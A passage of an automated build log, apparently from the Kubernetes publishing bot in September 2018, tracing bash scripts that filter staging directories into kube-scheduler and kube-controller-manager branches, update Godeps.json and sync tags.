'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' f79e0b4b33a9f995cdc1beff2e5225bb771be606 '!=' f79e0b4b33a9f995cdc1beff2e5225bb771be606 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.12,apiserver:release-1.12 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,apiserver:release-1.12 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/kube-scheduler\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiserver/\") or . == \"k8s.io/apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/kube-scheduler/\") or . == \"k8s.io/kube-scheduler\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t++ git-find-merge 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '30b0b2d36c9719ec02a6a0414db2ddc802b040e7^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 30b0b2d36c9719ec02a6a0414db2ddc802b040e7..upstream-branch --ancestry-path\n>\t+++ git rev-parse 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local k_last_kube_merge=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ local k_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 3b307a310a061fc549c8801bfe72ea3d30948920 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 3b307a310a061fc549c8801bfe72ea3d30948920'\n>\t+ git checkout -q 3b307a310a061fc549c8801bfe72ea3d30948920\n>\tChecking out k8s.io/apimachinery to 3b307a310a061fc549c8801bfe72ea3d30948920\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=apiserver\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ../kube-commits-apiserver-release-1.12\n>\t+ '[' -z 6287f470a5b62c40cf4882df1a8ca148fd687cb3 ']'\n>\t+ pushd ../apiserver\n>\t+ echo 'Checking out k8s.io/apiserver to 6287f470a5b62c40cf4882df1a8ca148fd687cb3'\n>\t+ git checkout -q 6287f470a5b62c40cf4882df1a8ca148fd687cb3\n>\tChecking out k8s.io/apiserver to 6287f470a5b62c40cf4882df1a8ca148fd687cb3\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\tRemove redundant godep commits on-top of f79e0b4b33a9f995cdc1beff2e5225bb771be606.\n>\t+ echo 'Remove redundant godep commits on-top of f79e0b4b33a9f995cdc1beff2e5225bb771be606.'\n>\t+ git reset --soft -q f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-scheduler\n>\t+ local repo=kube-scheduler\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'f79e0b4 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-scheduler-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-scheduler-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-scheduler-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-scheduler-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-scheduler-release-1.12.sh --dependencies apimachinery:release-1.12,apiserver:release-1.12 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse release-1.12\n>\t+ '[' f79e0b4b33a9f995cdc1beff2e5225bb771be606 '!=' f79e0b4b33a9f995cdc1beff2e5225bb771be606 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Sep 18 09:56 UTC]: Successfully constructed release-1.12\n>[09 Sep 18 09:56 UTC]: Successfully ensured /go-workspace/src/k8s.io/kube-controller-manager exists\n>[09 Sep 18 09:56 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Sep 18 09:56 UTC]: /publish_scripts/construct.sh kube-controller-manager master master apimachinery:master,apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-controller-manager\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tFetching from origin.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' f26556cc14e2a01a1904805566e082484c1f33f9 '!=' f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\tSkipping sync because upstream/master at f26556cc14e2a01a1904805566e082484c1f33f9 did not change since last sync.\n>\t+ echo 'Skipping sync because upstream/master at f26556cc14e2a01a1904805566e082484c1f33f9 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=fedc51a6cc66985e0eb9d8898fe046617a354d74\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-controller-manager-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-controller-manager-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kube-controller-manager-master.sh --dependencies apimachinery:master,apiserver:master -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse master\n>\t+ '[' fedc51a6cc66985e0eb9d8898fe046617a354d74 '!=' fedc51a6cc66985e0eb9d8898fe046617a354d74 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[09 Sep 18 09:56 UTC]: Successfully constructed master\n>[09 Sep 18 09:56 UTC]: /publish_scripts/construct.sh kube-controller-manager release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-controller-manager\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q fedc51a6cc66985e0eb9d8898fe046617a354d74\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\t+ echo 'Switching to origin/release-1.12.'\n>\tSwitching to origin/release-1.12.\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 '!=' f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\tUpstream branch upstream/release-1.12 moved from 'f26556cc14e2a01a1904805566e082484c1f33f9' to '30b0b2d36c9719ec02a6a0414db2ddc802b040e7'. We have to sync.\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''f26556cc14e2a01a1904805566e082484c1f33f9'\\'' to '\\''30b0b2d36c9719ec02a6a0414db2ddc802b040e7'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/kube-scheduler release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/kube-scheduler\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\te859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 8 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit e859f217aca987cf1ce6d08066a14a8e80d44d59.\n>\t+ echo 'Starting at existing release-1.12 commit e859f217aca987cf1ce6d08066a14a8e80d44d59.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ echo 'Checked out source commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.12\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t++ git-find-merge 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 upstream/release-1.12\n>\t++ tail -1\n>\t+++ git rev-list '30b0b2d36c9719ec02a6a0414db2ddc802b040e7^1..upstream/release-1.12' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 30b0b2d36c9719ec02a6a0414db2ddc802b040e7..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-parse 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local k_base_merge=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t+ git branch -f filtered-branch-base 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/kube-scheduler.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/kube-scheduler.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/kube-scheduler 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/kube-scheduler\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\tRunning git filter-branch ...\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/kube-scheduler -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=a0ae31695b456bef5c4ee1597afd9934e8b9b019\n>\t++ git log --first-parent --format=%H --reverse a0ae31695b456bef5c4ee1597afd9934e8b9b019..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\tChecking out branch release-1.12.\n>\t+ git checkout -q release-1.12\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' e859f217aca987cf1ce6d08066a14a8e80d44d59 '!=' e859f217aca987cf1ce6d08066a14a8e80d44d59 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.12,apiserver:release-1.12 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,apiserver:release-1.12 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/kube-controller-manager\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' 